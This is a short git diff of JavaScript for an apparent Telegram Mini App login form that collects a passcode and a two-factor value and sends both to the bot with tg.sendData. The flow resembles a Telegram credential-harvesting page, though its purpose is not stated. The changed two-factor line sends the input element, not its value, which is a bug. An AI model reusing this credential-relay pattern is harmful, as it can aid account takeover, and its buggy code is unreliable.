@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const page2 = document.getElementById('page2');
     const blur = document.getElementById('blur');
     const passcodeBtn = document.getElementById('passcode-btn');
-    const passcodeInput = document.getElementById('passcode-input');
+    const passcodeInput = document.getElementById('hiddenInput');
     const twofactorInput = document.getElementById('twofactor-input');
 
     loginBtn.addEventListener('click', async () => {
@@ -50,25 +50,24 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     passcodeBtn.addEventListener('click', () => {
-        const value = passcodeInput.value;
-        page2.style.transform = 'translate(-50%, 40px)';
-        page2.style.opacity = '0';
+        // page2.style.transform = 'translate(-50%, 40px)';
+        // page2.style.opacity = '0';
         tg.sendData(passcodeInput.value);
 
-        setTimeout(() => {
-            page2.style.display = 'none';
+        // setTimeout(() => {
+        //     page2.style.display = 'none';
 
-            page3.style.display = 'flex';
-            requestAnimationFrame(() => {
-                page3.style.transform = 'translate(0)';
-                page3.style.opacity = '1';
-            });
-        }, 200);
+        //     page3.style.display = 'flex';
+        //     requestAnimationFrame(() => {
+        //         page3.style.transform = 'translate(0)';
+        //         page3.style.opacity = '1';
+        //     });
+        // }, 200);
     });
 
     const twofactorBtn = document.getElementById('twofactor-btn');
     twofactorBtn.addEventListener('click', () => {
-        const value = twofactorInput.value;
+        const value = twofactorInput;
         tg.sendData(
             JSON.stringify({ action: 'twofactor_value', value: value })
         );
